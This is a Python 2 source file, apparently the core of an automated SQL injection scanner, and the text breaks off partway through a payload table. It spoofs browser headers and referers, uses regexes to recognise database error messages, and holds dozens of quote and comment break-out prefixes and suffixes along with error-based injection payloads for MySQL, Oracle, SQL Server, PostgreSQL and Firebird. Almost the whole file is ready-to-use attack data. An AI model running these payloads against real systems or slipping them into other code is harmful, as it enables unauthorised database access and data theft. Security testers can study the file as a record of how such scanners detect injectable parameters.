# coding:utf-8
import random
import re
import string
import binascii
import difflib
import requests
import multiprocessing
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()
from urllib2 import quote
import sys

reload(sys)
sys.setdefaultencoding('utf-8')
UNICODE_ENCODING = "utf8"


# 注入参数字符串编码

def unicodeencode(value, encoding=None):
    """
    Returns 8-bit string representation of the supplied unicode value

    >>> unicodeencode(u'foobar')
    'foobar'
    """

    retVal = value
    if isinstance(value, unicode):
        try:
            retVal = value.encode(encoding or UNICODE_ENCODING)
        except UnicodeEncodeError:
            retVal = value.encode(UNICODE_ENCODING, "replace")
    return retVal


def utf8encode(value):
    """
    Returns 8-bit string representation of the supplied UTF-8 value

    >>> utf8encode(u'foobar')
    'foobar'
    """

    return unicodeencode(value, "utf-8")


def escaper(value):
    retVal = None
    try:
        retVal = "0x%s" % binascii.hexlify(value)
    except UnicodeEncodeError:
        retVal = "CONVERT(0x%s USING utf8)" % "".join("%.2x" % ord(_) for _ in utf8encode(value))
    return retVal


# 数据库报错

REFERERS = [
    "https://www.baidu.com",
    "http://www.baidu.com",
    "https://www.google.com.hk",
    "http://www.so.com",
    "http://www.sogou.com",
    "http://www.soso.com",
    "http://www.bing.com",
]

headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

headers = {
    'User-Agent': random.choice(headerss),
    'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Cache-Control': 'max-age=0',
    'referer': random.choice(REFERERS),
    'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
}

sql_errors = {'SQL syntax': 'MYSQL',
              'syntax to use near': 'MYSQL',
              'MySQLSyntaxErrorException': 'MYSQL',
              'valid MySQL result': 'MYSQL',
              'SQL syntax.*?MySQL': 'MYSQL',
              'Warning.*?mysql_': 'MYSQL',
              'MySqlException \(0x': 'MYSQL',
              "PostgreSQL.*?ERROR": "PostgreSQL",
              "Warning.*?\Wpg_": "PostgreSQL",
              "valid PostgreSQL result": "PostgreSQL",
              "Npgsql\.": "PostgreSQL",
              "PG::SyntaxError:": "PostgreSQL",
              "org\.postgresql\.util\.PSQLException": "PostgreSQL",
              "ERROR:\s\ssyntax error at or near": "PostgreSQL",
              "Driver.*? SQL[\-\_\ ]*Server": "Microsoft SQL Server",
              "OLE DB.*? SQL Server": "Microsoft SQL Server",
              "SQL Server[^&lt;&quot;]+Driver": "Microsoft SQL Server",
              "Warning.*?(mssql|sqlsrv)_": "Microsoft SQL Server",
              "SQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}": "Microsoft SQL Server",
              "System\.Data\.SqlClient\.SqlException": "Microsoft SQL Server",
              "(?s)Exception.*?\WRoadhouse\.Cms\.": "Microsoft SQL Server",
              "Microsoft SQL Native Client error '[0-9a-fA-F]{8}": "Microsoft SQL Server",
              "com\.microsoft\.sqlserver\.jdbc\.SQLServerException": "Microsoft SQL Server",
              "ODBC SQL Server Driver": "Microsoft SQL Server",
              "ODBC Driver \d+ for SQL Server": "Microsoft SQL Server",
              "SQLServer JDBC Driver": "Microsoft SQL Server",
              "macromedia\.jdbc\.sqlserver": "Microsoft SQL Server",
              "com\.jnetdirect\.jsql": "Microsoft SQL Server",
              "SQLSrvException": "Microsoft SQL Server",
              "Microsoft Access (\d+ )?Driver": "Microsoft Access",
              "JET Database Engine": "Microsoft Access",
              "Access Database Engine": "Microsoft Access",
              "ODBC Microsoft Access": "Microsoft Access",
              "Syntax error \(missing operator\) in query expression": "Microsoft Access",
              "ORA-\d{5}": "Oracle",
              "Oracle error": "Oracle",
              "Oracle.*?Driver": "Oracle",
              "Warning.*?\Woci_": "Oracle",
              "Warning.*?\Wora_": "Oracle",
              "oracle\.jdbc\.driver": "Oracle",
              "quoted string not properly terminated": "Oracle",
              "SQL command not properly ended": "Oracle",
              "DB2 SQL error": "CLI Driver.*?DB2",
              "db2_\w+\(": "CLI Driver.*?DB2",
              "SQLSTATE.+SQLCODE": "CLI Driver.*?DB2",
              'check the manual that corresponds to your (MySQL|MariaDB) server version': 'MYSQL',
              "Unknown column '[^ ]+' in 'field list'": 'MYSQL',
              "MySqlClient\.": 'MYSQL',
              'com\.mysql\.jdbc\.exceptions': 'MYSQL',
              'Zend_Db_Statement_Mysqli_Exception': 'MYSQL',
              'Access Database Engine': 'Microsoft Access',
              'JET Database Engine': 'Microsoft Access',
              'Microsoft Access Driver': 'Microsoft Access',
              'SQLServerException': 'Microsoft SQL Server',
              'SqlException': 'Microsoft SQL Server',
              'SQLServer JDBC Driver': 'Microsoft SQL Server',
              'Incorrect syntax': 'Microsoft SQL Server',
              'MySQL Query fail': 'MYSQL',
              'Unknown column.*?order clause': 'MYSQL'
              }

'''
前缀与后缀
需要获取5个对象
RADNSTR # 随机字符串 4字节
RANDNUM # 随机数字 随便
RANDSTR1# 随机字符串 4字节后面修改
RANDSTR2# 同上
ORIGINAL# 获取url中的传递参数值
'''
pre_suf = {

    'pre_suf_1': {'prefix': ')',
                  'suffix': '('},

    'pre_suf_2': {'prefix': '))',
                  'suffix': '(('},

    'pre_suf_3': {'prefix': "')",
                  'suffix': "('"},

    'pre_suf_4': {'prefix': '"',
                  'suffix': '"'},

    'pre_suf_5': {'prefix': "'",
                  'suffix': "'"},

    'pre_suf_6': {'prefix': '")',
                  'suffix': '("'},

    'pre_suf_7': {'prefix': ')"',
                  'suffix': '"('},

    'pre_suf_8': {'prefix': ")'",
                  'suffix': "('"},

    'pre_suf_9': {'prefix': ')))',
                  'suffix': '((('},

    'pre_suf_10': {'prefix': ')',
                   'suffix': '%23'},

    'pre_suf_11': {'prefix': ')',
                   'suffix': '--+'},

    'pre_suf_12': {'prefix': "')",
                   'suffix': '%23'},

    'pre_suf_13': {'prefix': "')",
                   'suffix': '--+'},

    'pre_suf_14': {'prefix': '"',
                   'suffix': '%23'},

    'pre_suf_15': {'prefix': '"',
                   'suffix': '--+'},

    'pre_suf_16': {'prefix': "'",
                   'suffix': "--+"},

    'pre_suf_17': {'prefix': ')',
                   'suffix': ' AND ([RANDNUM]=[RANDNUM]'},

    'pre_suf_18': {'prefix': '))',
                   'suffix': ' AND (([RANDNUM]=[RANDNUM]'},

    'pre_suf_19': {'prefix': ')))',
                   'suffix': '( AND ((([RANDNUM]=[RANDNUM]'},

    'pre_suf_20': {'prefix': "')",
                   'suffix': " AND ('[RANDSTR]'='[RANDSTR]"},

    'pre_suf_21': {'prefix': "'))",
                   'suffix': " AND (('[RANDSTR]'='[RANDSTR]"},

    'pre_suf_22': {'prefix': "')))",
                   'suffix': " AND ((('[RANDSTR]'='[RANDSTR]"},

    'pre_suf_23': {'prefix': "'",
                   'suffix': " AND '[RANDSTR]'='[RANDSTR]"},

    'pre_suf_24': {'prefix': "')",
                   'suffix': " AND ('[RANDSTR]' LIKE '[RANDSTR]"},

    'pre_suf_25': {'prefix': "'))",
                   'suffix': " AND (('[RANDSTR]' LIKE '[RANDSTR]"},

    'pre_suf_26': {'prefix': "')))",
                   'suffix': " AND ((('[RANDSTR]' LIKE '[RANDSTR]"},

    'pre_suf_27': {'prefix': '")',
                   'suffix': ' AND ("[RANDSTR]"="[RANDSTR]'},

    'pre_suf_28': {'prefix': '"))',
                   'suffix': ' AND (("[RANDSTR]"="[RANDSTR]'},

    'pre_suf_29': {'prefix': '")))',
                   'suffix': ' AND ((("[RANDSTR]"="[RANDSTR]'},

    'pre_suf_30': {'prefix': '"',
                   'suffix': ' AND "[RANDSTR]"="[RANDSTR]'},

    'pre_suf_31': {'prefix': '")',
                   'suffix': ' AND ("[RANDSTR]" LIKE "[RANDSTR]'},

    'pre_suf_32': {'prefix': '"))',
                   'suffix': ' AND (("[RANDSTR]" LIKE "[RANDSTR]'},

    'pre_suf_33': {'prefix': '")))',
                   'suffix': ' AND ((("[RANDSTR]" LIKE "[RANDSTR]'},

    'pre_suf_34': {'prefix': '"',
                   'suffix': ' AND "[RANDSTR]" LIKE "[RANDSTR]'},

    'pre_suf_35': {'prefix': ' ',
                   'suffix': '# [RANDSTR]'},

    'pre_suf_36': {'prefix': ' ',
                   'suffix': '%23'},

    'pre_suf_38': {'prefix': "'",
                   'suffix': " OR '[RANDSTR1]'='[RANDSTR2]"},

    'pre_suf_39': {'prefix': "') WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '%23'},

    'pre_suf_40': {'prefix': "') WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '--+'},

    'pre_suf_41': {'prefix': '") WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_42': {'prefix': '") WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_43': {'prefix': ') WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_44': {'prefix': ') WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_45': {'prefix': "' WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '%23'},

    'pre_suf_46': {'prefix': "' WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '--+'},

    'pre_suf_47': {'prefix': '" WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_48': {'prefix': '" WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_49': {'prefix': ' WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_50': {'prefix': ' WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_51': {'prefix': "'||(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': "||'"},

    'pre_suf_52': {'prefix': "'||(SELECT '[RANDSTR]' FROM DUAL WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': "||'"},

    'pre_suf_53': {'prefix': "'+(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': "+'"},

    'pre_suf_54': {'prefix': "||(SELECT '[RANDSTR]' FROM DUAL WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '||'},

    'pre_suf_55': {'prefix': "||(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '||'},

    'pre_suf_56': {'prefix': '+(SELECT [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '+'},

    'pre_suf_57': {'prefix': "+(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '+'},

    'pre_suf_58': {'prefix': "')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '%23'},

    'pre_suf_59': {'prefix': "')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '--+'},

    'pre_suf_60': {'prefix': '")) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_61': {'prefix': '")) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_62': {'prefix': ')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_63': {'prefix': ')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_64': {'prefix': "') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '%23'},

    'pre_suf_65': {'prefix': "') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]",
                   'suffix': '--+'},

    'pre_suf_66': {'prefix': '") AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_67': {'prefix': '") AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_68': {'prefix': ') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_69': {'prefix': ') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_70': {'prefix': '` WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_71': {'prefix': '` WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_72': {'prefix': '`) WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '%23'},

    'pre_suf_73': {'prefix': '`) WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': '--+'},

    'pre_suf_74': {'prefix': '`=`[ORIGINAL]`',
                   'suffix': ' AND `[ORIGINAL]`=`[ORIGINAL]'},

    'pre_suf_75': {'prefix': '"="[ORIGINAL]"',
                   'suffix': ' AND "[ORIGINAL]"="[ORIGINAL]'},

    'pre_suf_76': {'prefix': ']-(SELECT 0 WHERE [RANDNUM]=[RANDNUM]',
                   'suffix': ')|[[ORIGINAL]'},

    'pre_suf_77': {'prefix': "' IN BOOLEAN MODE)",
                   'suffix': '#'}

}

'''
需要一些特定的参数
DELIMITER_START # 随机字符作为开头
RANDNUM # 随机数字
DELIMITER_STOP # 随机字符作为结尾
RANDNUM1 # 随机数字+1
RANDNUM2 # 随机数字+2
RANDNUM3 # 随机数字+3
RANDNUM4 # 随机数字+4
RANDNUM5 # 随机数字+5
'''
error_base_injection = {
    'INJPAY_27':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"},
    'INJPAY_26':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')"},
    'INJPAY_25':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')"},
    'INJPAY_24':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"},
    'INJPAY_23':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"},
    'INJPAY_22':
        {'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')"},
    'INJPAY_21':
        {'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')"},
    'INJPAY_20':
        {'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"},
    'INJPAY_50':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))"},
    'INJPAY_29':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"},
    'INJPAY_28':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"},
    'INJPAY_51':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])"},
    'INJPAY_38':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1]))"},
    'INJPAY_39':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')))"},
    'INJPAY_55':
        {'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))"},
    'INJPAY_30':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"},
    'INJPAY_31':
        {'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')"},
    'INJPAY_32':
        {'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')"},
    'INJPAY_33':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)"},
    'INJPAY_34':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"},
    'INJPAY_35':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"},
    'INJPAY_36':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))"},
    'INJPAY_37':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"},
    'INJPAY_12':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)"},
    'INJPAY_13':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)"},
    'INJPAY_10':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])"},
    'INJPAY_11':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])"},
    'INJPAY_16':
        {'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)"},
    'INJPAY_17':
        {'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"},
    'INJPAY_14':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)"},
    'INJPAY_15':
        {'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)"},
    'INJPAY_18':
        {'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"},
    'INJPAY_19':
        {'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"},
    'INJPAY_52':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)"},
    'INJPAY_56':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"},
    'INJPAY_57':
        {'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))"},
    'INJPAY_54':
        {'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
